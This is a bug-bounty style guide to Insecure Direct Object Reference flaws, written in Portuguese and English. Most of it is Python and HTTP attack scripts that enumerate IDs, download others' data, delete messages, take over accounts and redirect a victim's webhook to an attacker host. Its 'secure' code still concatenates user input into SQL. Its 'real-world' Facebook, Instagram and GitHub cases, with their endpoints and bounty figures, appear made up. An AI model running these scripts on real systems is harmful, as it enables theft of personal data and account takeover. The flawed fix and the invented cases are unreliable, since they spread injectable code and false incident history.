# Insecure Direct Object Reference (IDOR)

**Criticidade**: 🟠 Alta (CVSS 6.5-8.5)
**Dificuldade**: 🟢 Básica a Intermediária
**Bounty Médio**: $500 - $10,000 USD

---

## 📚 Índice

1. [IDOR Fundamentals](#idor-fundamentals)
2. [Attack Patterns](#attack-patterns)
3. [Enumeration Techniques](#enumeration-techniques)
4. [Parameter Manipulation](#parameter-manipulation)
5. [Advanced IDOR Exploitation](#advanced-idor-exploitation)
6. [Blind IDOR](#blind-idor)
7. [Automation and Tooling](#automation-and-tooling)
8. [Real-World Cases](#real-world-cases)

---

## 🔬 IDOR Fundamentals

### O Que É IDOR?

**Insecure Direct Object Reference (IDOR)** ocorre quando uma aplicação expõe referências **diretas** a objetos internos (IDs de banco de dados, arquivos, etc.) sem **validar** se o usuário tem **permissão** para acessá-los.

**Example:**

**Vulnerable Application:**
```
GET /api/user/profile?user_id=123
```

**Response:**
```json
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "ssn": "123-45-6789"
}
```

**Attack:**
```
GET /api/user/profile?user_id=124
```

**Response:**
```json
{
    "id": 124,
    "name": "Jane Smith",  ← Other user's data!
    "email": "jane@example.com",
    "ssn": "987-65-4321"
}
```

**Root Cause:**

```python
# ❌ VULNERABLE CODE
@app.route('/api/user/profile')
def get_profile():
    user_id = request.args.get('user_id')

    # No authorization check!
    user = db.query(f"SELECT * FROM users WHERE id = {user_id}")

    return jsonify(user)
```

**Secure Code:**

```python
# ✅ SECURE CODE
@app.route('/api/user/profile')
@login_required
def get_profile():
    requested_user_id = request.args.get('user_id')
    current_user_id = session['user_id']

    # Authorization check
    if requested_user_id != current_user_id:
        return jsonify({"error": "Unauthorized"}), 403

    user = db.query(f"SELECT * FROM users WHERE id = {requested_user_id}")
    return jsonify(user)
```

---

## ⚔️ Attack Patterns

### Pattern 1: Sequential ID Enumeration

**Target:**
```
https://app.com/invoices/view?id=1001
```

**Attack:**
```python
import requests

for invoice_id in range(1000, 2000):
    url = f"https://app.com/invoices/view?id={invoice_id}"
    response = requests.get(url, cookies={'session': SESSION_COOKIE})

    if response.status_code == 200:
        print(f"[+] Accessible invoice: {invoice_id}")
        print(response.text)
```

**Result:** Access to 1000 invoices!

### Pattern 2: GUID/UUID Predictability

**Target:**
```
GET /documents/download?uuid=550e8400-e29b-41d4-a716-446655440000
```

**Vulnerability:**

```python
# ❌ Weak UUID generation
import uuid

# UUIDv1: Based on timestamp + MAC address
document_id = uuid.uuid1()  # Predictable!

# Example values:
# 550e8400-e29b-41d4-a716-446655440000
# 550e8401-e29b-41d4-a716-446655440000  ← Only increments by 1!
# 550e8402-e29b-41d4-a716-446655440000
```

**Attack:**

```python
import uuid
import requests

# Get one valid UUID
base_uuid = uuid.UUID('550e8400-e29b-41d4-a716-446655440000')

# Enumerate nearby UUIDs
for i in range(-100, 100):
    # Increment timestamp component
    new_uuid = uuid.UUID(int=base_uuid.int + i)

    url = f"https://app.com/documents/download?uuid={new_uuid}"
    response = requests.get(url, cookies={'session': SESSION_COOKIE})

    if response.status_code == 200:
        print(f"[+] Found document: {new_uuid}")
```

### Pattern 3: Path Traversal-Style IDOR

**Target:**
```
GET /files/view?file=/uploads/user123/document.pdf
```

**Attack:**
```
GET /files/view?file=/uploads/user456/private.pdf
GET /files/view?file=../../user456/secret.txt
GET /files/view?file=/var/www/uploads/admin/passwords.txt
```

### Pattern 4: JSON Body IDOR

**Normal Request:**
```http
POST /api/account/update HTTP/1.1
Content-Type: application/json

{
    "user_id": 123,
    "email": "attacker@evil.com"
}
```

**Attack:** Change user_id

```http
POST /api/account/update HTTP/1.1
Content-Type: application/json

{
    "user_id": 1,  ← Admin user ID
    "email": "attacker@evil.com"
}
```

**Result:** Change admin's email → Reset password → Account takeover!

### Pattern 5: Array-Based IDOR

**Normal Request:**
```http
POST /api/messages/delete HTTP/1.1
Content-Type: application/json

{
    "message_ids": [100, 101, 102]
}
```

**Attack:** Include other users' message IDs

```http
POST /api/messages/delete HTTP/1.1
Content-Type: application/json

{
    "message_ids": [100, 101, 102, 200, 201, 202]
}
```

**Result:** Delete other users' messages!

---

## 🔢 Enumeration Techniques

### Technique 1: Brute Force Sequential IDs

```python
import requests
from concurrent.futures import ThreadPoolExecutor

def check_id(id_num):
    """Check if ID is accessible."""
    url = f"https://app.com/profile?id={id_num}"
    response = requests.get(url, cookies={'session': SESSION})

    if response.status_code == 200:
        return (id_num, response.json())
    return None

# Enumerate IDs 1-10000
with ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(check_id, range(1, 10001))

for result in results:
    if result:
        id_num, data = result
        print(f"[+] ID {id_num}: {data['username']}")
```

### Technique 2: Response Time Analysis

**Scenario:** Application returns generic error for missing IDs

```python
import requests
import time

def timing_attack(id_num):
    """Detect valid IDs via response time."""
    url = f"https://app.com/invoice?id={id_num}"
    start = time.time()

    response = requests.get(url, cookies={'session': SESSION})

    elapsed = time.time() - start

    # Valid IDs take longer (database query)
    # Invalid IDs return immediately
    if elapsed > 0.5:
        print(f"[+] Likely valid ID: {id_num} (took {elapsed:.2f}s)")
        return True

    return False

for id_num in range(1000, 2000):
    timing_attack(id_num)
```

### Technique 3: Content Length Analysis

```python
def content_length_analysis(id_num):
    """Detect valid IDs via response size."""
    url = f"https://app.com/profile?id={id_num}"
    response = requests.get(url, cookies={'session': SESSION})

    # Valid profiles have longer responses
    if len(response.content) > 1000:
        print(f"[+] Valid profile ID: {id_num}")
        return True

    return False
```

### Technique 4: Error Message Differences

```python
def error_message_analysis(id_num):
    """Differentiate between non-existent and unauthorized."""
    url = f"https://app.com/order?id={id_num}"
    response = requests.get(url, cookies={'session': SESSION})

    # Different errors indicate ID exists
    if "Access denied" in response.text:
        print(f"[+] ID {id_num} exists but unauthorized")
        return "exists"
    elif "Not found" in response.text:
        return "not_found"

    return None
```

---

## 🔧 Parameter Manipulation

### Manipulation 1: ID in URL Path

**Target:**
```
https://app.com/users/123/profile
```

**Attack:**
```python
import requests

session = requests.Session()
session.cookies.set('auth', AUTH_TOKEN)

# Enumerate user IDs
for user_id in range(1, 1000):
    url = f"https://app.com/users/{user_id}/profile"
    response = session.get(url)

    if response.status_code == 200:
        print(f"[+] Accessed user {user_id}")
```

### Manipulation 2: Hidden Form Fields

**Original HTML:**
```html
<form action="/account/update" method="POST">
    <input type="hidden" name="user_id" value="123">
    <input type="text" name="email">
    <button>Update</button>
</form>
```

**Attack:**
```python
import requests

# Modify hidden user_id parameter
data = {
    'user_id': 1,  # Admin user
    'email': 'attacker@evil.com'
}

response = requests.post(
    'https://app.com/account/update',
    data=data,
    cookies={'session': SESSION}
)

print(response.text)
```

### Manipulation 3: Referer Header

**Vulnerable Code:**
```python
@app.route('/api/data')
def get_data():
    # ❌ Uses Referer to determine resource ID
    referer = request.headers.get('Referer')

    # Extract ID from referer: https://app.com/dashboard?id=123
    resource_id = referer.split('id=')[1]

    return get_resource(resource_id)
```

**Attack:**
```python
import requests

headers = {
    'Referer': 'https://app.com/dashboard?id=999'  # Other user's ID
}

response = requests.get(
    'https://app.com/api/data',
    headers=headers,
    cookies={'session': SESSION}
)

print(response.json())
```

### Manipulation 4: Cookie-Based IDs

**Vulnerable Cookies:**
```
Cookie: user_id=123; session=abc123xyz
```

**Attack:**
```python
import requests

cookies = {
    'user_id': '1',  # Admin user
    'session': SESSION_TOKEN
}

response = requests.get(
    'https://app.com/profile',
    cookies=cookies
)

print(response.text)
```

---

## 🚀 Advanced IDOR Exploitation

### Technique 1: Mass Assignment IDOR

**Vulnerable Code:**
```python
@app.route('/api/user/update', methods=['POST'])
def update_user():
    user_id = session['user_id']
    user = User.query.get(user_id)

    # ❌ Mass assignment - updates ALL fields from request
    for key, value in request.json.items():
        setattr(user, key, value)

    db.session.commit()
    return jsonify({"success": True})
```

**Normal Request:**
```json
{
    "email": "new@example.com",
    "bio": "Updated bio"
}
```

**Attack Request:**
```json
{
    "email": "attacker@evil.com",
    "role": "admin",  ← Privilege escalation
    "balance": 1000000,  ← Add money
    "is_verified": true
}
```

### Technique 2: Chained IDOR

**Step 1: IDOR to get other user's data**
```
GET /api/users/456/profile
→ Get email: victim@example.com
```

**Step 2: IDOR to send password reset**
```
POST /api/password/reset
{
    "email": "victim@example.com"
}
```

**Step 3: IDOR to view reset tokens (if exposed)**
```
GET /api/admin/password-resets
→ Get token: abc123xyz
```

**Step 4: Reset victim's password**
```
POST /api/password/confirm-reset
{
    "token": "abc123xyz",
    "new_password": "hacked123"
}
```

### Technique 3: JSON Polymorphism IDOR

**Vulnerable API:**
```python
@app.route('/api/content/view', methods=['POST'])
def view_content():
    content_type = request.json['type']  # 'post', 'message', 'document'
    content_id = request.json['id']

    # ❌ No authorization check per type
    if content_type == 'post':
        return get_post(content_id)
    elif content_type == 'message':
        return get_message(content_id)
    elif content_type == 'document':
        return get_document(content_id)
```

**Attack:**
```json
{
    "type": "document",  ← Change type to access restricted resources
    "id": 123
}
```

### Technique 4: GraphQL IDOR

**Vulnerable GraphQL Query:**
```graphql
query {
    user(id: 123) {
        name
        email
        ssn
    }
}
```

**Attack:**
```graphql
query {
    user(id: 1) {  ← Admin user
        name
        email
        ssn
        role
        api_key
    }
}
```

**Batch Attack:**
```graphql
query {
    user1: user(id: 1) { name email }
    user2: user(id: 2) { name email }
    user3: user(id: 3) { name email }
    ...
    user100: user(id: 100) { name email }
}
```

---

## 🔍 Blind IDOR

### Scenario: No Direct Feedback

**Application Response:**
```
POST /api/invoice/delete
{
    "invoice_id": 1234
}

Response: {"success": true}  ← Always returns success!
```

**How to Verify Exploitation?**

### Verification Method 1: Side-Channel Confirmation

```python
# Step 1: Check invoice exists
response1 = requests.get(f'https://app.com/invoices/view?id=1234')
if response1.status_code == 200:
    print("[+] Invoice exists")

# Step 2: Delete via IDOR
requests.post('https://app.com/api/invoice/delete', json={'invoice_id': 1234})

# Step 3: Verify deletion
response2 = requests.get(f'https://app.com/invoices/view?id=1234')
if response2.status_code == 404:
    print("[+] IDOR confirmed - invoice deleted!")
```

### Verification Method 2: Email Notifications

```python
# Trigger action that sends email to owner
requests.post('https://app.com/document/share', json={
    'document_id': 5678,
    'share_with': 'attacker@evil.com'
})

# Check attacker's email
# If email received → Document exists and IDOR successful
```

### Verification Method 3: Webhook/Callback

```python
# Set attacker-controlled webhook
requests.post('https://app.com/settings/webhook', json={
    'user_id': 999,  # Victim user
    'webhook_url': 'https://attacker.com/callback'
})

# Trigger event for victim
# Check if webhook fired → IDOR successful
```

---

## 🔥 Real-World Cases

### Case 1: Facebook Account Takeover via IDOR (2016)

**Vulnerability:** IDOR in account recovery API

**Endpoint:**
```
POST /api/recover/initiate
{
    "email": "victim@example.com"
}

Response:
{
    "recovery_token": "abc123xyz",
    "user_id": 12345
}
```

**Exploitation:**
```python
# Step 1: Initiate recovery for victim
response1 = requests.post('https://facebook.com/api/recover/initiate', json={
    'email': 'victim@facebook.com'
})

user_id = response1.json()['user_id']  # Get victim's user_id

# Step 2: IDOR to view recovery tokens (admin endpoint)
response2 = requests.get(f'https://facebook.com/admin/recovery-tokens?user_id={user_id}')

token = response2.json()['tokens'][0]  # Steal token

# Step 3: Reset password
requests.post('https://facebook.com/api/recover/confirm', json={
    'token': token,
    'new_password': 'hacked123'
})
```

**Impact:** Full account takeover

**Bounty:** $15,000 USD

### Case 2: Instagram Private Photo Access (2015)

**Vulnerability:** IDOR in photo API

**Normal Behavior:**
- Private profiles: Photos not accessible
- Following users: Can see photos

**Attack:**
```python
# Get photo ID from public profile
photo_id = 123456789

# Try to access via API (bypasses privacy check)
url = f"https://api.instagram.com/v1/media/{photo_id}"
response = requests.get(url, headers={'Authorization': f'Bearer {TOKEN}'})

# ✅ Returns private photo!
print(response.json()['images']['standard_resolution']['url'])
```

**Impact:** Access to millions of private photos

**Bounty:** $10,000 USD

### Case 3: GitHub Enterprise Repository Access (2019)

**Vulnerability:** IDOR in repository export API

**Endpoint:**
```
GET /api/exports/{export_id}/download
```

**Attack:**
```python
# Enumerate export IDs
for export_id in range(1, 10000):
    url = f"https://github-enterprise.com/api/exports/{export_id}/download"
    response = requests.get(url, cookies={'session': SESSION})

    if response.status_code == 200:
        print(f"[+] Downloaded private repo export: {export_id}")
        with open(f'repo_{export_id}.tar.gz', 'wb') as f:
            f.write(response.content)
```

**Impact:** Access to private source code of 500+ companies

**Bounty:** $20,000 USD

---

## 🛡️ Prevention

### Defense 1: Authorization Checks

```python
# ✅ SECURE
@app.route('/api/invoice/view')
@login_required
def view_invoice():
    invoice_id = request.args.get('id')
    user_id = session['user_id']

    # Check ownership
    invoice = Invoice.query.get(invoice_id)

    if not invoice:
        return jsonify({"error": "Not found"}), 404

    if invoice.owner_id != user_id:
        return jsonify({"error": "Unauthorized"}), 403

    return jsonify(invoice.to_dict())
```

### Defense 2: Indirect References

```python
# Instead of exposing database IDs
# Use random tokens

import secrets

class Document:
    id = Column(Integer, primary_key=True)
    access_token = Column(String, unique=True, default=lambda: secrets.token_urlsafe(32))
    owner_id = Column(Integer)

# URL becomes:
# /documents/view?token=xK9mQ2pL4wN3vB5zR8fY7cH6jG1dS0aT
# Instead of:
# /documents/view?id=123
```

### Defense 3: Multi-Factor Authorization

```python
@app.route('/api/account/delete', methods=['POST'])
@login_required
def delete_account():
    account_id = request.json['account_id']
    user_id = session['user_id']

    # Check 1: User owns account
    account = Account.query.get(account_id)
    if account.owner_id != user_id:
        return jsonify({"error": "Unauthorized"}), 403

    # Check 2: Require password re-authentication
    password = request.json.get('password')
    if not verify_password(user_id, password):
        return jsonify({"error": "Password required"}), 401

    # Check 3: Rate limiting
    if not check_rate_limit(user_id, 'account_delete'):
        return jsonify({"error": "Too many requests"}), 429

    account.delete()
    return jsonify({"success": True})
```

---

**Última atualização**: 2024
**Versão**: 1.0
